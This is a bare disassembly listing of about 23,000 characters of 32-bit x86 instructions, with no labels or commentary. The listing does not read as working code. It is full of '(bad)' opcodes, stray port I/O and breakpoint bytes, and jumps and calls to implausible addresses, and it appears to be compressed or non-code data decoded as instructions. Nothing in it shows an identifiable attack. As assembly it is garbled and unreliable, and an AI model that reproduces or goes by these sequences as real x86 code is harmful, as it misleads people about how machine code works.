  430d6d:	lods   eax,DWORD PTR ds:[esi]
  430d6e:	mov    edx,DWORD PTR [edx-0x34]
  430d71:	dec    esi
  430d72:	out    0x83,eax
  430d74:	into   
  430d75:	push   edi
  430d77:	loopne 0x430d47
  430d79:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d7d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d84:	rol    DWORD PTR [edx],0x8
  430d87:	mov    esp,ecx
  430d89:	cmp    DWORD PTR [ebx],0xc
  430d8c:	mov    esi,0x5001c0
  430d91:	push   eax
  430d92:	push   cs
  430d93:	push   eax
  430d94:	(bad)  
  430d95:	sub    edx,edi
  430d97:	push   esi
  430d98:	adc    al,0xcb
  430d9a:	ins    DWORD PTR es:[edi],dx
  430d9b:	mov    eax,0x203e8
  430da0:	add    al,ah
  430da2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430da9:	add    dh,al
  430dab:	add    ah,ch
  430dad:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430db3:	pop    ecx
  430db4:	or     eax,ebx
  430db6:	cli    
  430db7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430dbd:	lea    ebp,[ebx]
  430dbf:	mov    edx,DWORD PTR [edx-0x4]
  430dc2:	dec    ecx
  430dc3:	inc    ebp
  430dc4:	shr    BYTE PTR [ebx],0x4b
  430dc7:	and    al,0x0
  430dc9:	(bad)  
  430dca:	jne    0x430e11
  430dcc:	pop    eax
  430dcd:	mov    al,0x5a
  430dcf:	call   0x142102e
  430dd4:	and    al,0x85
  430dd6:	push   edx
  430dd7:	add    BYTE PTR [eax+eax*1+0x0],ah
  430ddb:	dec    ebp
  430ddc:	mov    cl,0x23
  430dde:	jmp    0x430dcc
  430de0:	mov    al,0xe7
  430de2:	call   0x13910d0
  430de7:	shr    DWORD PTR [eax+ebx*2],cl
  430dea:	lock (bad) 
  430dec:	adc    eax,0x757f008d
  430df1:	out    0x58,eax
  430df3:	cmp    al,0x7
  430df5:	pop    edx
  430df6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dfd:	push   ecx
  430dfe:	cld    
  430dff:	mov    esi,0x3b0175
  430e04:	and    al,0xb0
  430e06:	xor    BYTE PTR [edx+0x1],0x8b
  430e0a:	add    ah,bh
  430e0c:	mov    edi,DWORD PTR [ebp-0x4]
  430e0f:	psubsw mm7,QWORD PTR [edi]
  430e12:	add    DWORD PTR [ebp+0x0],ebp
  430e15:	rcr    eax,1
  430e17:	mov    edi,ecx
  430e19:	and    eax,DWORD PTR [eax]
  430e1b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430e21:	call   0x130110a
  430e26:	add    al,cl
  430e28:	mov    ebp,esi
  430e2a:	aam    0x83
  430e2c:	or     DWORD PTR [ecx],eax
  430e2e:	jne    0x430e21
  430e30:	mov    eax,DWORD PTR [eax]
  430e32:	aam    0x0
  430e34:	dec    ebp
  430e35:	jne    0x430dc2
  430e37:	cmp    ebx,eax
  430e39:	jb     0x430e88
  430e3b:	jmp    0x430dc8
  430e3d:	mov    ebx,esp
  430e3f:	int3   
  430e40:	dec    ebp
  430e41:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e48:	mov    edx,0x8b0a8b
  430e4d:	cmp    ecx,DWORD PTR [eax]
  430e4f:	jb     0x430e28
  430e51:	pop    edx
  430e52:	push   edi
  430e53:	cli    
  430e54:	pop    es
  430e55:	mov    eax,ecx
  430e57:	jb     0x430e5b
  430e59:	add    DWORD PTR [ebx],0xa
  430e5c:	mov    eax,DWORD PTR [ebx]
  430e5e:	int3   
  430e5f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e65:	jmp    0x430df2
  430e67:	mov    al,0xe8
  430e69:	call   0x10410eb
  430e6e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e71:	pop    edi
  430e72:	or     BYTE PTR [ecx-0x73],bl
  430e75:	pop    ecx
  430e76:	inc    edi
  430e77:	xor    al,0xeb
  430e79:	push   ecx
  430e7a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e80:	call   0xb20f85
  430e85:	int3   
  430e86:	sbb    BYTE PTR [esi],ch
  430e88:	inc    ebp
  430e89:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e8f:	call   0x9c10fe
  430e94:	or     BYTE PTR [ebx-0x73],dl
  430e97:	cmp    al,0x47
  430e99:	mov    al,0x1
  430e9b:	jb     0x430e9d
  430e9d:	mov    al,0x10
  430e9f:	push   eax
  430ea0:	add    al,0x75
  430ea2:	add    BYTE PTR [ebx],ch
  430ea4:	add    ebx,esp
  430ea6:	int3   
  430ea7:	jne    0x430eb9
  430ea9:	movsx  edx,cl
  430eac:	add    DWORD PTR [eax],eax
  430eae:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430eb5:	mov    gs,edi
  430eb7:	add    BYTE PTR [eax-0x50],ch
  430eba:	add    al,ch
  430ebc:	mov    eax,DWORD PTR [ecx]
  430ebe:	sub    eax,DWORD PTR [eax]
  430ec0:	jb     0x430f37
  430ec2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ec6:	jge    0x430eb0
  430ec8:	add    al,0x1
  430eca:	add    DWORD PTR [eax],0x0
  430ecd:	jne    0x430ecf
  430ecf:	je     0x430f16
  430ed1:	mov    eax,DWORD PTR [edi]
  430ed3:	ror    BYTE PTR [ebp+0x4d],1
  430ed6:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430edd:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430ee3:	mov    DWORD PTR [ebx],ebp
  430ee5:	fadd   DWORD PTR [eax+0x75]
  430ee8:	inc    eax
  430ee9:	pop    eax
  430eea:	lea    ebx,[ecx+0x4f]
  430eed:	push   0xb1000003
  430ef2:	out    dx,eax
  430ef3:	add    ebp,DWORD PTR [edx+edx*2]
  430ef6:	add    BYTE PTR [ebx+ecx*4],bh
  430ef9:	mov    ch,BYTE PTR [ebx]
  430efb:	jb     0x430f6f
  430efd:	add    al,0x89
  430eff:	push   eax
  430f00:	call   0x842b5c72
  430f05:	add    DWORD PTR [eax+eax*1],eax
  430f08:	jae    0x430f1e
  430f0a:	icebp  
  430f0b:	inc    ebp
  430f0c:	mov    eax,DWORD PTR gs:[ecx]
  430f0f:	int3   
  430f10:	out    dx,al
  430f11:	loopne 0x430f60
  430f13:	sub    eax,DWORD PTR [edx]
  430f15:	push   0xffffff83
  430f17:	pop    esi
  430f18:	push   cs
  430f19:	jl     0x430f34
  430f1b:	add    al,0xaf
  430f1d:	xor    eax,0x832b6d00
  430f22:	mov    eax,DWORD PTR [edx]
  430f24:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430f2a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430f30:	inc    ebp
  430f31:	shr    ebx,0x3
  430f34:	or     DWORD PTR [eax],0x4
  430f37:	push   0xffffffa5
  430f39:	pop    esi
  430f3a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f41:	jmp    0x430fa0
  430f43:	mov    edi,0xff0272
  430f48:	fdivr  QWORD PTR [ebp+0x5d]
  430f4b:	push   0x4e
  430f4d:	pop    ecx
  430f4e:	call   0x435353
  430f53:	mov    DWORD PTR [ebx],eax
  430f55:	in     al,0xc8
  430f57:	rol    BYTE PTR [ebp-0x75],0xc1
  430f5b:	call   0xad113c
  430f60:	pop    esi
  430f61:	enter  0xceff,0x8b
  430f65:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f69:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f70:	je     0x430f72
  430f72:	or     DWORD PTR [ebx-0x74183b24],eax
  430f78:	jne    0x430f5e
  430f7a:	jmp    0x430f75
  430f7c:	push   DWORD PTR [edx-0x24]
  430f7f:	push   0x4d
  430f81:	pop    ecx
  430f82:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f86:	jge    0x430f8e
  430f88:	mov    eax,eax
  430f8a:	sub    ebp,DWORD PTR [edx+0x24]
  430f8d:	pop    esi
  430f8e:	inc    ebp
  430f8f:	mov    esp,0x8b6077
  430f94:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f9a:	lods   al,BYTE PTR ds:[esi]
  430f9b:	add    BYTE PTR [ebx],bh
  430f9d:	enter  0xce73,0x49
  430fa1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430fa9:	stc    
  430faa:	jge    0x43101e
  430fac:	jnp    0xdd42931b
  430fb2:	call   0xc61088
  430fb7:	fadd   st(0),st
  430fb9:	dec    esi
  430fba:	ins    BYTE PTR es:[edi],dx
  430fbb:	stc    
  430fbc:	cmp    al,0x73
  430fbe:	push   ebp
  430fbf:	mov    eax,0xf8028b
  430fc4:	jne    0x430f87
  430fc6:	mov    esi,ecx
  430fc8:	mov    esp,DWORD PTR [ebp+0x2c]
  430fcb:	add    edi,DWORD PTR [ebp-0x24]
  430fce:	sub    esp,eax
  430fd0:	and    al,0x45
  430fd2:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430fd8:	sbb    al,0xee
  430fda:	pop    esi
  430fdb:	call   0x83100b
  430fe0:	fsubr  st,st(3)
  430fe2:	sti    
  430fe3:	add    BYTE PTR gs:[ecx],bh
  430fe6:	add    eax,esp
  430fe8:	add    DWORD PTR [esi],eax
  430fea:	rol    DWORD PTR [ebp+0x8],0x29
  430fee:	mov    esp,eax
  430ff0:	clc    
  430ff1:	jne    0x431068
  430ff3:	mov    eax,0x8b0673
  430ff8:	loopne 0x43103f
  430ffa:	loopne 0x430f85
  430ffc:	lods   al,BYTE PTR ds:[esi]
  430ffd:	int3   
  430ffe:	inc    ebp
  430fff:	mov    DWORD PTR gs:[eax+edi*8],eax
  431003:	add    al,0xc3
  431005:	sub    ecx,DWORD PTR [ebp+0x47]
  431008:	(bad)  
  43100a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43100e:	add    eax,DWORD PTR [eax]
  431010:	call   0x644d115
  431015:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43101b:	dec    esi
  43101c:	ins    DWORD PTR es:[edi],dx
  43101d:	in     al,dx
  43101e:	lea    eax,[eax]
  431020:	inc    ebp
  431021:	inc    ebp
  431022:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431028:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431032:	and    al,0xdc
  431034:	ror    DWORD PTR [edx+0x24],0xf7
  431038:	or     BYTE PTR [ebp+0x4c],dh
  43103b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43103f:	stos   BYTE PTR es:[edi],al
  431040:	adc    edx,edi
  431042:	inc    esp
  431043:	add    edi,DWORD PTR [eax]
  431045:	jne    0x43102a
  431047:	mov    DWORD PTR [eax-0x7449db04],ecx
  43104d:	cmp    ecx,DWORD PTR [edi]
  43104f:	sub    BYTE PTR [ebp-0x7e],dl
  431052:	sar    ebp,0xb
  431055:	jmp    FWORD PTR [edi+0x2400392a]
  43105b:	sub    esi,DWORD PTR [ebx-0x73]
  43105e:	mov    esp,DWORD PTR [ecx+edi*4]
  431061:	mov    ecx,DWORD PTR [eax]
  431063:	and    BYTE PTR [eax],al
  431065:	jne    0x431031
  431067:	sub    ebp,ecx
  431069:	sbb    BYTE PTR [esi+0x32],ah
  43106c:	dec    ebp
  43106d:	push   ebp
  43106e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431074:	ret    
  431075:	mov    edx,ebp
  431077:	leave  
  431078:	sub    DWORD PTR [esi+0x24],ebx
  43107b:	ret    0x2b
  43107e:	pop    ax
  431080:	push   ebp
  431081:	rol    BYTE PTR [ebx],0xeb
  431084:	add    DWORD PTR [ecx+0x6c0001],0x40
  43108b:	jb     0x4310e2
  43108d:	ret    
  43108e:	in     al,dx
  43108f:	jecxz  0x43101c
  431091:	push   esi
  431092:	xchg   esp,eax
  431093:	jne    0x431095
  431095:	cmp    edx,DWORD PTR [esi+0x1c]
  431098:	jne    0x43107e
  43109a:	mov    eax,DWORD PTR [ebp-0x77]
  43109d:	ror    DWORD PTR [ebx+0x899408],0xe0
  4310a4:	mov    esi,DWORD PTR [ebp-0x75]
  4310a7:	pop    esi
  4310a8:	nop
  4310a9:	mov    eax,DWORD PTR [eax]
  4310ab:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4310b1:	add    al,0x0
  4310b3:	inc    ebp
  4310b4:	mov    eax,DWORD PTR [ebx]
  4310b6:	mov    ebp,ebx
  4310b8:	cmp    al,0xf
  4310ba:	or     al,al
  4310bc:	inc    ebp
  4310bd:	inc    ebp
  4310be:	xor    eax,0x8bc89c8b
  4310c3:	ins    BYTE PTR es:[edi],dx
  4310c4:	cld    
  4310c5:	add    BYTE PTR [edi+0x536c16c0],dh
  4310cb:	add    BYTE PTR [ecx-0x5],dl
  4310ce:	add    eax,0x17200
  4310d3:	sbb    al,0x85
  4310d5:	dec    esp
  4310d6:	je     0x431110
  4310d8:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4310dc:	add    BYTE PTR [ebx],bh
  4310de:	(bad)  
  4310df:	and    al,0x34
  4310e1:	jae    0x43107f
  4310e3:	mov    cl,cl
  4310e5:	inc    DWORD PTR [esp]
  4310e8:	push   ebp
  4310e9:	shr    esp,0x8
  4310ec:	in     al,dx
  4310ed:	push   esp
  4310ee:	add    DWORD PTR [eax],esp
  4310f0:	add    bl,cl
  4310f2:	inc    ebp
  4310f3:	mov    bh,0x89
  4310f5:	add    ah,bh
  4310f7:	jmp    0xca772041
  4310fc:	pushf  
  4310fd:	dec    esp
  4310fe:	push   ebx
  4310ff:	and    BYTE PTR [ebp+0x17],al
  431102:	xor    eax,0x56009cd9
  431107:	add    BYTE PTR [ebp+0x2b],al
  43110a:	in     eax,0xc1
  43110c:	inc    ebp
  43110d:	add    eax,0xc601d8
  431112:	mov    al,0xc6
  431115:	ins    BYTE PTR es:[edi],dx
  431116:	mov    DWORD PTR [eax+0x6a],0xc805c6c1
  43111d:	dec    esp
  43111e:	xor    esp,DWORD PTR [eax]
  431120:	(bad)  
  431121:	fxch   st(1)
  431123:	sub    DWORD PTR [ebx],esi
  431125:	add    BYTE PTR [edx-0x40],bl
  431128:	mov    eax,0x248d8d00
  43112e:	xor    eax,0x188b0fc3
  431133:	push   ecx
  431134:	fimul  DWORD PTR [edx+0x8801d9]
  43113a:	or     DWORD PTR [ebx+0x36ed0806],0x45
  431141:	xor    ebx,ebp
  431143:	mov    al,BYTE PTR [ebp+0x1]
  431146:	jmp    0xdb4c564b
  43114b:	mov    dl,0x45
  43114d:	add    esi,ebp
  43114f:	add    BYTE PTR [ebp+0xe],al
  431152:	sub    DWORD PTR [edx+0x2e0145],eax
  431158:	inc    ebp
  431159:	or     BYTE PTR [ecx+ecx*2-0xa],bh
  43115d:	add    eax,DWORD PTR [edi+eax*8-0x24]
  431161:	cld    
  431162:	mov    dh,0xa5
  431164:	xor    edi,eax
  431166:	add    eax,DWORD PTR [ebp+0x46]
  431169:	prefetcht0 BYTE PTR [ecx-0x2]
  43116d:	xor    eax,0x7c60872
  431172:	mov    esp,0xbd32c69a
  431177:	pop    esi
  431178:	mov    cl,0xbe
  43117b:	or     al,0xc6
  43117d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431184:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43118b:	add    dh,al
  43118d:	mov    eax,ebx
  43118f:	xor    DWORD PTR [ebx],0x35008dbc
  431195:	mov    ecx,DWORD PTR [edi]
  431197:	sbb    al,0x18
  431199:	inc    ebp
  43119a:	fcmovb st,st(7)
  43119c:	fxtract 
  43119e:	mov    BYTE PTR [ebp-0x38f7077d],al
  4311a4:	in     eax,dx
  4311a5:	call   0xf942972f
  4311aa:	inc    esi
  4311ac:	inc    ebp
  4311ad:	les    ecx,FWORD PTR [ebx-0x103a273a]
  4311b3:	push   edi
  4311b4:	adc    eax,DWORD PTR [ebp-0x77]
  4311b7:	out    0x8b,eax
  4311b9:	inc    ebp
  4311ba:	cmp    BYTE PTR [ecx],ch
  4311bc:	inc    DWORD PTR [ebp+0x3b]
  4311bf:	inc    ebp
  4311c0:	jne    0x4311f0
  4311c2:	(bad)  
  4311c3:	(bad)  
  4311c4:	mov    eax,0xf87c8545
  4311c9:	test   BYTE PTR [ebp-0x47],0xea
  4311cd:	add    BYTE PTR [eax+eax*1-0x3b03bb75],bl
  4311d4:	xor    BYTE PTR [esi+0x3003301],0x38
  4311db:	inc    esi
  4311dc:	test   DWORD PTR [eax],ebx
  4311de:	add    bh,dh
  4311e0:	add    BYTE PTR [edx+0x45],dh
  4311e3:	(bad)  
  4311e4:	mov    ebx,esp
  4311e6:	jl     0x4311ae
  4311e8:	add    ch,bl
  4311ea:	mov    esi,eax
  4311ec:	mov    ebx,esi
  4311ee:	cld    
  4311ef:	mov    BYTE PTR [eax+0xc601df],0xe0
  4311f6:	cmp    dh,al
  4311f8:	imul   esp,ecx,0xe28dc600
  4311fe:	shl    DWORD PTR [ebx],1
  431200:	mov    DWORD PTR [ebp+0xfff3564],ecx
  431206:	mov    ebx,DWORD PTR [eax]
  431208:	data16 fiadd DWORD PTR [ebp-0x770027]
  43120f:	add    eax,0x7
  431212:	in     ax,dx
  431214:	test   DWORD PTR [ebp-0x1],eax
  431217:	jmp    0xe48a581b
  43121c:	inc    bp
  43121e:	test   eax,esp
  431220:	inc    DWORD PTR [ebp-0x1]
  431223:	cmc    
  431224:	rol    BYTE PTR [ebp+0x66],0xdf
  431228:	test   DWORD PTR [ebp-0x1],eax
  43122b:	in     al,dx
  43122c:	inc    DWORD PTR [ebp+0x47]
  43122f:	out    0x66,eax
  431231:	inc    ebp
  431232:	test   DWORD PTR [edi+edi*8-0xa],edi
  431236:	inc    DWORD PTR [eax+eax*8-0x44]
  43123a:	data16 mov dh,0x85
  43123d:	xor    edi,edi
  43123f:	add    edi,edi
  431241:	inc    esi
  431242:	inc    edi
  431243:	sbb    BYTE PTR [esi-0x2],ah
  431246:	test   DWORD PTR [edx-0x1],esi
  431249:	(bad)  
  43124a:	(bad)  
  43124b:	cmp    bh,al
  43124d:	dec    DWORD PTR [ecx-0x278b77]
  431253:	dec    ebp
  431254:	cmp    DWORD PTR [eax+0x7189fc03],0x76
  43125b:	add    edi,edi
  43125d:	lea    edi,[eax+0xff99ff]
  431263:	enter  0xe89,0x78
  431267:	inc    ebp
  431268:	push   DWORD PTR ds:0xc7829cb8
  43126e:	add    BYTE PTR [eax-0x7857a77],bh
  431274:	inc    DWORD PTR [ebp-0x48]
  431277:	mov    edx,edi
  431279:	mov    WORD PTR [eax],es
  43127b:	add    BYTE PTR [ecx-0xf083c7],cl
  431281:	pop    edi
  431282:	add    DWORD PTR [eax],0xffffffe4
  431285:	mov    ecx,DWORD PTR [ecx-0x7f8104]
  43128b:	add    DWORD PTR [eax+0x382700],edi
  431291:	inc    ebp
  431292:	mov    DWORD PTR [ebx+0x4c8080],ecx
  431298:	add    BYTE PTR [ecx+0x4f45b866],cl
  43129e:	lea    eax,[eax]
  4312a0:	add    eax,0x89660878
  4312a5:	test   DWORD PTR [edi+edi*8-0x381600bb],eax
  4312ac:	loopne 0x431237
  4312ae:	(bad)  
  4312af:	data16 aam 0xff
  4312b2:	in     al,dx
  4312b3:	cmp    DWORD PTR [edi+edi*1+0x45],0xffffff89
  4312b8:	pop    ecx
  4312b9:	push   0x8ddaff18
  4312be:	jmp    0x4312bf
  4312c0:	mov    BYTE PTR [ecx-0x8a95c0],cl
  4312c6:	lea    eax,[ebx-0x767aee30]
  4312cc:	(bad)  
  4312cd:	ins    BYTE PTR es:[edi],dx
  4312ce:	(bad)  
  4312cf:	inc    DWORD PTR [ebp-0xfb0173]
  4312d5:	mov    DWORD PTR [ebx+0x53fff46e],ecx
  4312db:	adc    DWORD PTR [ecx+0x3d],0x33
  4312df:	mov    DWORD PTR [ebx+0xff7270],edi
  4312e5:	(bad)  
  4312e6:	ret    
  4312e7:	add    cl,BYTE PTR [ebx-0x3f8d0377]
  4312ed:	call   DWORD PTR [eax-0x75]
  4312f0:	inc    ebp
  4312f1:	mov    ax,WORD PTR [ebp-0xff0068]
  4312f8:	mov    eax,0x85ff66b0
  4312fe:	add    edi,edi
  431300:	add    bh,bh
  431302:	(bad)  
  431303:	stc    
  431304:	inc    DWORD PTR [eax]
  431306:	or     BYTE PTR [esi+0x45],ah
  431309:	test   DWORD PTR [ebp-0x7e008a01],eax
  43130f:	outs   dx,BYTE PTR ds:[esi]
  431310:	pop    DWORD PTR [eax]
  431312:	adc    ah,BYTE PTR [esi-0x78]
  431315:	test   DWORD PTR [eax-0x1],esi
  431318:	mov    ecx,0x6b4fff
  43131d:	add    cl,al
  43131f:	mov    WORD PTR [ebp-0x3f0078],ax
  431326:	mov    eax,eax
  431328:	data16 push bp
  43132b:	test   DWORD PTR [ebp-0x76000201],ecx
  431331:	dec    esp
  431332:	mov    WORD PTR [eax],es
  431334:	ret    0x6666
  431337:	inc    ebp
  431338:	push   ebp
  431339:	mov    eax,0xf3478d
  43133e:	mov    DWORD PTR [ecx+0x47c28290],ecx
  431344:	pushw  0x55
  431347:	lea    ax,[ebp-0x1f]
  43134b:	(bad)  
  43134c:	mov    eax,edx
  43134e:	xchg   esp,eax
  43134f:	in     al,0x89
  431351:	cmc    
  431352:	xchg   esi,eax
  431353:	inc    ebp
  431354:	iret   
  431355:	fisttp WORD PTR [ecx+0x4a8d98e7]
  43135b:	ror    BYTE PTR [ebx+0x5532668a],1
  431361:	or     BYTE PTR [ebx+0x55186639],0x49
  431368:	(bad)  
  431369:	repz cmp eax,0xa0898945
  43136f:	mov    ah,0x89
  431371:	jmp    DWORD PTR [edx+0x66b0418d]
  431377:	inc    DWORD PTR [ebp+0x50]
  43137a:	add    DWORD PTR [ebp-0xd],0xffffffbe
  43137e:	mov    DWORD PTR [eax],ecx
  431380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431381:	pop    es
  431382:	inc    ecx
  431383:	(bad)  
  431384:	call   0x366:0x3245
  43138a:	dec    ebp
  43138b:	push   eax
  43138c:	inc    bp
  43138e:	jge    0x431313
  431390:	mov    esp,DWORD PTR [esi-0x18]
  431393:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431399:	add    DWORD PTR [ebx],esi
  43139b:	add    BYTE PTR [ebx],al
  43139d:	test   DWORD PTR [ebx],esi
  43139f:	(bad)  
  4313a0:	inc    WORD PTR [ebp+0x0]
  4313a4:	mov    eax,DWORD PTR [eax]
  4313a6:	call   0x8898cadb
  4313ab:	mov    esi,eax
  4313ad:	clc    
  4313ae:	ret    
  4313af:	rol    cl,0xa
  4313b2:	mov    DWORD PTR ds:0x7c0ec88,esi
  4313b8:	mov    edx,edi
  4313ba:	pushf  
  4313bb:	pop    es
  4313bc:	jmp    DWORD PTR [edx+0x66]
  4313bf:	add    BYTE PTR [ebp-0x990175],al
  4313c5:	inc    ebp
  4313c6:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4313cc:	push   ebp
  4313cd:	mov    edi,eax
  4313cf:	mov    dh,BYTE PTR [eax+0x266ff51]
  4313d5:	push   ebp
  4313d6:	add    BYTE PTR [ebx-0x764b0777],al
  4313dc:	dec    DWORD PTR [esi+0x661851e8]
  4313e2:	add    BYTE PTR [ebp-0x7b],dl
  4313e5:	cmp    esi,0xfffffff3
  4313e8:	dec    DWORD PTR [ecx+0x51fe9285]
  4313ee:	jmp    DWORD PTR [esi-0x75]
  4313f1:	push   ebp
  4313f2:	hlt    
  4313f3:	data16 (bad) 
  4313f5:	dec    ebp
  4313f6:	ret    
  4313f7:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313fd:	lea    edx,[eax-0x1]
  431400:	jne    0x4313d3
  431402:	dec    DWORD PTR [ecx-0x2f7a63f8]
  431408:	dec    BYTE PTR [ecx+0x51559eff]
  43140e:	mov    DWORD PTR [esi-0x4c],esp
  431411:	push   ebp
  431412:	jmp    DWORD PTR [esi-0x18]
  431415:	inc    ebp
  431416:	sbb    BYTE PTR [ebp-0x767acd00],cl
  43141c:	(bad)  
  43141d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43141e:	inc    eax
  431420:	test   DWORD PTR [esi-0x2],esp
  431423:	inc    ebp
  431424:	dec    DWORD PTR [ebp-0x760bde75]
  43142a:	(bad)  
  43142b:	test   al,0xc3
  43142d:	mov    DWORD PTR [ebp-0x769b56],ecx
  431433:	lods   al,BYTE PTR ds:[esi]
  431434:	push   eax
  431435:	inc    ebp
  431436:	jne    0x431447
  431438:	dec    DWORD PTR [ebp+0x8]
  43143b:	mov    eax,DWORD PTR [ebx]
  43143d:	sbb    al,0x0
  43143f:	(bad)  
  431440:	mov    eax,0xc14fc3
  431445:	mov    DWORD PTR [eax-0x64],edi
  431448:	inc    bp
  43144a:	test   DWORD PTR [edi],ecx
  43144c:	dec    DWORD PTR [ebp-0x1]
  43144f:	xor    eax,edi
  431451:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  431457:	inc    ebp
  431458:	xor    DWORD PTR [ebx],0x3f
  43145b:	mov    WORD PTR [ebp-0x1bc],ax
  431462:	lea    ecx,[ecx-0x767702]
  431468:	inc    esi
  431469:	(bad)  
  43146a:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  431471:	pushf  
  431472:	rol    DWORD PTR [ebp-0x72019a],0xff
  431479:	add    bh,bh
  43147b:	add    BYTE PTR [edi],cl
  43147d:	test   DWORD PTR [eax],eax
  43147f:	(bad)  
  431480:	dec    WORD PTR [ebp-0xff0031]
  431487:	mov    DWORD PTR [ecx-0xb748],ecx
  43148d:	lea    eax,[ebx+0x7cffc1b0]
  431493:	push   eax
  431494:	add    BYTE PTR [ebp+0x66],al
  431497:	xor    ecx,DWORD PTR [ebp-0xaf00fd]
  43149d:	test   eax,esi
  43149f:	(bad)  
  4314a0:	fdiv   st(7),st
  4314a2:	add    bh,bh
  4314a4:	data16 clc 
  4314a6:	lea    edx,[ebp-0x1]
  4314a9:	(bad)  
  4314aa:	dec    DWORD PTR [eax-0x72b50077]
  4314b0:	dec    DWORD PTR [eax-0x1237a73]
  4314b6:	(bad)  
  4314b7:	(bad)  
  4314b8:	(bad)  
  4314b9:	cdq    
  4314ba:	inc    DWORD PTR [eax]
  4314bc:	ja     0x431447
  4314be:	lea    edi,[eax-0x72000050]
  4314c4:	push   ecx
  4314c5:	mov    al,0x4d
  4314c7:	jmp    DWORD PTR [esi+0x50]
  4314ca:	mov    ch,0x45
  4314cc:	push   DWORD PTR [ebx]
  4314ce:	inc    DWORD PTR [ebx]
  4314d0:	push   ebx
  4314d1:	push   eax
  4314d2:	push   ecx
  4314d3:	test   DWORD PTR [ebx],esi
  4314d5:	(bad)  
  4314d6:	mov    ebx,0xff72ff
  4314db:	clc    
  4314dc:	retf   
  4314dd:	push   ebp
  4314de:	(bad)  
  4314df:	jmp    0x1421624
  4314e4:	push   ecx
  4314e5:	jae    0x4314a7
  4314e7:	add    BYTE PTR [ebp-0x38bb73],cl
  4314ed:	mov    DWORD PTR [ecx+0x40],edx
  4314f0:	(bad)  
  4314f1:	(bad)  
  4314f2:	cld    
  4314f3:	mov    eax,DWORD PTR [ebp-0x7a019a]
  4314f9:	inc    DWORD PTR [ebp-0x3f0101]
  4314ff:	inc    bp
  431501:	test   DWORD PTR [ebx+0xff98ff],ecx
  431507:	inc    edi
  431508:	(bad)  
  431509:	dec    si
  43150b:	test   edi,edi
  43150d:	(bad)  
  43150e:	cmp    eax,0xc74f7bff
  431513:	mov    edx,DWORD PTR [edx-0x7d]
  431516:	(bad)  
  431517:	mov    ebx,0x563a8931
  43151c:	(bad)  
  43151d:	call   FWORD PTR [esi-0x47]
  431520:	inc    DWORD PTR ds:0x893c00e2
  431526:	mov    DWORD PTR [eax-0x4c],ebx
  431529:	(bad)  
  43152a:	jmp    DWORD PTR [esi-0x1]
  43152d:	test   edi,edi
  43152f:	dec    DWORD PTR [eax]
  431531:	(bad)  
  431532:	inc    eax
  431534:	or     BYTE PTR [ecx+0x8b5745],bh
  43153a:	sbb    al,0x89
  43153c:	rcr    BYTE PTR [edx-0x7c],0xff
  431540:	add    ecx,DWORD PTR [ebx+0x6165b900]
  431546:	add    BYTE PTR [eax],al
  431548:	inc    ebp
  431549:	mov    DWORD PTR ds:0xc7ff9c5c,esi
  43154f:	data16 fdiv DWORD PTR [ebp-0x7007b]
  431556:	inc    ebp
  431557:	dec    ebp
  431558:	cmp    DWORD PTR [ecx-0x38b764],ecx
  43155e:	lock lea eax,[ebp+0x458df81c]
  431565:	(bad)  
  431566:	xor    eax,0x8b8b9fff
  43156b:	hlt    
  43156c:	cld    
  43156d:	mov    DWORD PTR [eax+0xff014c],eax
  431573:	mov    esi,0x78b0845
  431578:	cld    
  431579:	into   
  43157a:	dec    ebp
  43157b:	call   0x5100:0x38c328b
  431582:	mov    ecx,DWORD PTR [ebp-0x6f0075]
  431588:	add    BYTE PTR [ebx],dh
  43158a:	mov    DWORD PTR [eax-0x1c],eax
  43158d:	lea    edi,[ebp-0x2]
  431590:	test   edi,edi
  431592:	jne    0x4315e4
  431594:	push   DWORD PTR [ebp+0x18]
  431597:	mov    DWORD PTR [ebp+0x44],edx
  43159a:	call   0xffcd109e
  43159f:	mov    al,0x45
  4315a1:	dec    DWORD PTR [ebx+0x3fc8b8b]
  4315a7:	cmp    BYTE PTR [ecx+eax*1],0xf
  4315ab:	add    BYTE PTR [ebp-0x7b],al
  4315ae:	test   edi,edi
  4315b0:	je     0x4315b1
  4315b2:	dec    DWORD PTR [edi-0x4]
  4315b5:	dec    edi
  4315b6:	or     al,BYTE PTR [ebp-0x740001]
  4315bc:	cld    
